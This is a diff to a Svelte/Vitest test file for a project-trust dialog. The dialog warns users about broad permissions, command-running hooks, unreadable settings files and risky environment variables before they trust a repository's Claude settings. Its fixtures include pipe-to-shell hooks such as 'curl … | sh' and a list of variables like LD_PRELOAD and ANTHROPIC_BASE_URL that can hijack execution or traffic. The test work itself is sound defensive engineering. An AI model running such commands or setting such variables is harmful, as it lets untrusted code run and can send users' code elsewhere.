@@ -1,7 +1,9 @@
 import { flushSync, mount, unmount } from "svelte";
-import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
+import { listCommands } from "../../keys/commands";
 import type { AgentSetup } from "../../lib/protocol";
 import { CoreError } from "../../lib/transport";
+import { languageServers } from "../../lsp/servers.svelte";
 import { Workspace } from "../../shell/workspace.svelte";
 import { FakeAgentCore } from "../fake-core";
 import TestHost from "../TestHost.svelte";
@@ -13,7 +15,9 @@ import {
   countText,
   paidShort,
   paidText,
+  riskyEnv,
   summary,
+  TRUST_ARM_MS,
   warnings,
 } from "./texts";
 
@@ -21,6 +25,7 @@ let app: Record<string, unknown> | null = null;
 let target: HTMLElement;
 
 beforeEach(() => {
+  vi.useFakeTimers();
   target = document.createElement("div");
   document.body.append(target);
 });
@@ -29,13 +34,17 @@ afterEach(() => {
   if (app) unmount(app);
   app = null;
   target.remove();
+  vi.useRealTimers();
 });
 
-async function settle() {
+async function settle(ms = 0) {
   flushSync();
-  await new Promise((resolve) => setImmediate(resolve));
+  await vi.advanceTimersByTimeAsync(ms);
   flushSync();
 }
+
+/** Waits until the trust buttons count a press. */
+const armed = () => settle(TRUST_ARM_MS);
 
 async function show(core: FakeAgentCore) {
   const workspace = new Workspace();
@@ -113,12 +122,13 @@ describe("config changes", () => {
     expect(changeSummary(diff)).toBe("2 added, 1 removed");
     expect(
       warnings(
-        diff.map((c) => ({ kind: c.kind, entries: c.added })),
-        true,
+        diff.map((c) => ({ path: c.path, kind: c.kind, entries: c.added })),
+        "changed",
       ),
     ).toEqual({
       broad: null,
-      code: "1 new hook runs commands on your computer.",
+      code: 'Once you trust the changes, 1 new hook will run commands on your computer: "Stop: x".',
+      env: null,
       unreadable: null,
     });
   });
@@ -141,26 +151,88 @@ describe("trust summary", () => {
     expect(changeSummary([])).toBe("");
   });
 
-  it("names broad rules and counts what runs code", () => {
-    expect(warnings(items)).toEqual({
-      broad: "Claude will use Bash(*), Edit, Write and 1 more without asking you.",
-      code: "1 hook runs commands on your computer.",
+  it("names broad rules and what runs code, as what trusting would do", () => {
+    expect(warnings(items, "untrusted")).toEqual({
+      broad: "Once you trust this project, Claude will use Bash(*), Edit, Write and 1 more without asking you.",
+      code: 'Once you trust this project, 1 hook will run commands on your computer: "Stop: ./x.sh".',
+      env: null,
       unreadable: null,
     });
+    // Once trusted, it is what happens now.
+    expect(warnings(items, "trusted")).toMatchObject({
+      broad: "Claude uses Bash(*), Edit, Write and 1 more without asking you.",
+      code: '1 hook runs commands on your computer: "Stop: ./x.sh".',
+    });
     const code = [
-      { kind: "hooks" as const, entries: ["a", "b"] },
-      { kind: "plugins" as const, entries: ["p"] },
+      { path: "s.json", kind: "hooks" as const, entries: ["a", "b"] },
+      { path: "s.json", kind: "plugins" as const, entries: ["p"] },
     ];
-    expect(warnings(code).code).toBe("2 hooks and 1 plugin run commands on your computer.");
-    expect(warnings([{ kind: "broad_allow_rules", entries: ["Bash(*)"] }]).broad).toBe(
-      "Claude will use Bash(*) without asking you.",
+    // A plugin's name is not what it runs: nothing quoted.
+    expect(warnings(code, "trusted").code).toBe("2 hooks and 1 plugin run commands on your computer.");
+    const long = `SessionStart: curl -s https://x.example/${"a".repeat(100)} | sh`;
+    const two = warnings([{ path: "s.json", kind: "hooks", entries: ["Stop: ./a.sh", long] }], "changed").code;
+    expect(two).toBe(
+      `Once you trust the changes, 2 new hooks will run commands on your computer: "Stop: ./a.sh" and "${long.slice(0, 79)}…".`,
     );
-    expect(warnings([])).toEqual({ broad: null, code: null, unreadable: null });
-    // A file Ovra could not read may still hold hooks: it is warned about, not only counted.
-    expect(warnings([{ kind: "unreadable", entries: ["too large"] }]).unreadable).toBe(
-      "Ovra could not read 1 file of these settings; whatever it holds, hooks too, may load once you trust it.",
+    expect(warnings([{ path: "s.json", kind: "hooks", entries: ["a", "b", "c"] }], "trusted").code).toBe(
+      "3 hooks run commands on your computer.",
     );
-    expect(warnings([{ kind: "unreadable", entries: ["bad JSON"] }], true).unreadable).toContain("1 new file");
+    expect(warnings([], "untrusted")).toEqual({ broad: null, code: null, env: null, unreadable: null });
+  });
+
+  it("names unreadable files and why, since whatever they hold may load", () => {
+    const unreadable = [
+      { path: ".claude/settings.json", kind: "unreadable" as const, entries: ["expected value at line 1 column 2"] },
+      { path: ".claude/settings.local.json", kind: "unreadable" as const, entries: ["larger than 1048576 bytes"] },
+    ];
+    expect(warnings(unreadable, "untrusted").unreadable).toBe(
+      "Ovra could not read .claude/settings.json (expected value at line 1 column 2) and .claude/settings.local.json (larger than 1048576 bytes); whatever they hold, hooks too, may load once you trust this project.",
+    );
+    expect(warnings(unreadable.slice(1), "changed").unreadable).toBe(
+      "Ovra could not read the new .claude/settings.local.json (larger than 1048576 bytes); whatever it holds, hooks too, may load once you trust the changes.",
+    );
+  });
+
+  it("names environment variables that redirect Claude or run code", () => {
+    const risky = [
+      "ANTHROPIC_BASE_URL",
+      "ANTHROPIC_API_KEY",
+      "CLAUDE_CODE_USE_BEDROCK",
+      "OPENAI_BASE_URL",
+      "HTTPS_PROXY",
+      "https_proxy",
+      "ALL_PROXY",
+      "NODE_OPTIONS",
+      "BASH_ENV",
+      "ENV",
+      "LD_PRELOAD",
+      "DYLD_INSERT_LIBRARIES",
+      "PATH",
+      "Path",
+      "PYTHONPATH",
+      "PYTHONSTARTUP",
+      "GIT_SSH",
+      "GIT_SSH_COMMAND",
+      "GIT_EXEC_PATH",
+    ];
+    expect(risky.filter((name) => !riskyEnv(name))).toEqual([]);
+    const harmless = ["RUST_LOG", "NODE_ENV", "DEBUG", "GIT_AUTHOR_NAME", "MY_PATH_HINT", "ENVIRONMENT"];
+    expect(harmless.filter(riskyEnv)).toEqual([]);
+    const env = (entries: string[]) => [{ path: ".claude/settings.json", kind: "env" as const, entries }];
+    expect(warnings(env(["ANTHROPIC_BASE_URL", "NODE_ENV", "NODE_OPTIONS"]), "untrusted").env).toBe(
+      "Project settings set ANTHROPIC_BASE_URL and NODE_OPTIONS: once you trust this project, they can send your prompts and code elsewhere or run code.",
+    );
+    expect(warnings(env(["HTTPS_PROXY"]), "trusted").env).toBe(
+      "Project settings set HTTPS_PROXY: it can send your prompts and code elsewhere or run code.",
+    );
+    expect(warnings(env(["PATH"]), "changed").env).toBe(
+      "New project settings set PATH: once you trust the changes, it can send your prompts and code elsewhere or run code.",
+    );
+    expect(warnings(env(["NODE_ENV"]), "untrusted").env).toBeNull();
+    // Names the core cut from the list cannot be checked: said, not assumed harmless.
+    expect(warnings(env(["NODE_ENV", "… and 3 more"]), "untrusted").env).toBe(
+      "3 environment variables are not listed, so Ovra could not check them: read the settings files.",
+    );
   });
 });
 
@@ -300,7 +372,9 @@ describe("ProjectTrust", () => {
       items: [{ path: ".claude/settings.json", kind: "unreadable", entries: ["too large"] }],
     };
     await show(core);
-    expect(testid("trust-unreadable")).toContain("Ovra could not read 1 file");
+    expect(testid("trust-unreadable")).toBe(
+      "⚠ Ovra could not read .claude/settings.json (too large); whatever it holds, hooks too, may load once you trust this project.",
+    );
 
     if (app) unmount(app);
     const failing = new FakeAgentCore();
@@ -327,14 +401,25 @@ describe("ProjectTrust", () => {
     const workspace = await show(core);
     expect(heading()).toBe("This project has its own Claude settings");
     expect(testid("trust-summary")).toBe("2 broad permissions · 1 hook that runs code · 1 custom subagent");
-    expect(testid("broad-rules")).toBe("Claude will use Bash(*) and Edit without asking you.");
-    expect(testid("trust-runs-code")).toBe("1 hook runs commands on your computer.");
+    expect(testid("broad-rules")).toBe(
+      "⚠ Once you trust this project, Claude will use Bash(*) and Edit without asking you.",
+    );
+    expect(testid("trust-runs-code")).toBe(
+      '⚠ Once you trust this project, 1 hook will run commands on your computer: "PreToolUse (Bash): ./check.sh".',
+    );
     // No sandbox here (the fake reports none): said before the Trust button, not only in the details.
     expect(testid("trust-no-sandbox")).toContain("without a sandbox");
     // The lists wait behind "Show details".
-    expect(trustCard()?.textContent).not.toContain("./check.sh");
+    expect(trustCard()?.querySelector("[data-testid=trust-details]")).toBeNull();
+    // A click right as the card appears is not a decision: nothing is sent.
+    const trustButton = button(trustCard(), "Trust project");
+    expect(trustButton?.getAttribute("aria-disabled")).toBe("true");
+    trustButton?.click();
+    await settle();
     expect(core.sent("projects.trust")).toEqual([]);
-    button(trustCard(), "Trust project")?.click();
+    await armed();
+    expect(trustButton?.getAttribute("aria-disabled")).toBe("false");
+    trustButton?.click();
     await settle();
     expect(core.sent("projects.trust").map((c) => c.params)).toEqual([{ id: "p1", trusted: true, fingerprint: "f1" }]);
     expect(workspace.project?.trusted).toBe(true);
@@ -383,6 +468,7 @@ describe("ProjectTrust", () => {
     expect(testid("trust-language-servers")).toContain("starts language servers");
     expect(trustCard()?.querySelector("[role=note]")).toBeNull();
     expect(button(trustCard(), "Show details")).toBeUndefined();
+    await armed();
     button(trustCard(), "Trust project")?.click();
     await settle();
     expect(core.sent("projects.trust").map((c) => c.params)).toEqual([{ id: "p1", trusted: true, fingerprint: "f0" }]);
@@ -404,16 +490,24 @@ describe("ProjectTrust", () => {
     await settle();
     expect(heading()).toBe("Project settings changed");
     expect(testid("trust-summary")).toBe("1 added, 1 removed");
-    expect(testid("trust-runs-code")).toBe("1 new hook runs commands on your computer.");
+    expect(testid("trust-runs-code")).toBe(
+      '⚠ Once you trust the changes, 1 new hook will run commands on your computer: "PreToolUse: curl x | sh".',
+    );
     button(trustCard(), "Show details")?.click();
     flushSync();
     expect(trustCard()?.querySelector(".added")?.textContent).toContain("PreToolUse: curl x | sh");
     expect(trustCard()?.querySelector(".removed")?.textContent).toContain("Stop: ./done.sh");
     // A change that lands while the user looks is refused, then shown.
     core.config = { ...core.config, fingerprint: "newer" };
+    await armed();
     button(trustCard(), "Trust the new settings")?.click();
     await settle();
     expect(trustCard()?.querySelector("[role=alert]")?.textContent).toContain("review them again");
+    // What the card shows changed: the button waits again before it counts a press.
+    button(trustCard(), "Trust the new settings")?.click();
+    await settle();
+    expect(core.sent("projects.trust")).toHaveLength(1);
+    await armed();
     button(trustCard(), "Trust the new settings")?.click();
     await settle();
     expect(core.sent("projects.trust").map((c) => c.params.fingerprint)).toEqual(["new", "newer"]);
@@ -483,5 +577,71 @@ describe("ProjectTrust", () => {
     core.emit({ type: "fs.changed", data: { project: "p1", paths: [".claude/agents/x.md"] } });
     await settle();
     expect(core.sent("agents.project_config")).toHaveLength(asked + 1);
+  });
+
+  it("puts the review command on the heading, never on a Trust button, and ignores a held Enter", async () => {
+    const core = new FakeAgentCore();
+    core.config = {
+      fingerprint: "f1",
+      items: [{ path: ".claude/settings.json", kind: "broad_allow_rules", entries: ["Bash(*)"] }],
+    };
+    await show(core);
+    await armed();
+    // jsdom does not scroll.
+    Element.prototype.scrollIntoView = vi.fn();
+    const command = listCommands().find((c) => c.id === "projects.review_trust");
+    await command?.run();
+    await settle();
+    expect(testid("trust-details")).not.toBeNull();
+    expect(document.activeElement).toBe(trustCard()?.querySelector("#trust-heading"));
+    // The next Enter (a double press in the palette) lands on the heading and trusts nothing.
+    document.activeElement?.dispatchEvent(new KeyboardEvent("keydown", { code: "Enter", key: "Enter", bubbles: true }));
+    await settle();
+    expect(core.sent("projects.trust")).toEqual([]);
+    // Showing the details re-arms the buttons.
+    expect(button(trustCard(), "Trust project")?.getAttribute("aria-disabled")).toBe("true");
+    await armed();
+    const trustButton = button(trustCard(), "Trust project");
+    const press = (repeat: boolean) => {
+      const event = new KeyboardEvent("keydown", {
+        code: "Enter",
+        key: "Enter",
+        repeat,
+        bubbles: true,
+        cancelable: true,
+      });
+      trustButton?.dispatchEvent(event);
+      return event.defaultPrevented;
+    };
+    // Auto-repeat would click the focused button again and again: it is cancelled.
+    expect(press(true)).toBe(true);
+    expect(press(false)).toBe(false);
+  });
+
+  it("warns about risky environment variables and keeps sandbox internals in a tooltip", async () => {
+    const core = new FakeAgentCore();
+    core.config = {
+      fingerprint: "f1",
+      items: [{ path: ".claude/settings.json", kind: "env", entries: ["ANTHROPIC_BASE_URL", "NODE_ENV"] }],
+    };
+    const call = core.call.bind(core);
+    core.call = ((request: Parameters<typeof call>[0]) =>
+      request.method === "lsp.status"
+        ? Promise.resolve({
+            data: { trusted: false, sandbox: "bubblewrap, Landlock, seccomp", servers: [], known: [] },
+          })
+        : call(request)) as typeof core.call;
+    await show(core);
+    await languageServers(core).show("p1");
+    await settle();
+    expect(testid("trust-risky-env")).toBe(
+      "⚠ Project settings set ANTHROPIC_BASE_URL: once you trust this project, it can send your prompts and code elsewhere or run code.",
+    );
+    button(trustCard(), "Show details")?.click();
+    flushSync();
+    const servers = trustCard()?.querySelector("[data-testid=trust-details] [data-testid=trust-language-servers]");
+    expect(servers?.textContent).toContain("in the sandbox, which keeps them to the project");
+    expect(servers?.textContent).not.toMatch(/bubblewrap|Landlock|seccomp/);
+    expect(servers?.querySelector("[title]")?.getAttribute("title")).toBe("bubblewrap, Landlock, seccomp");
   });
 });
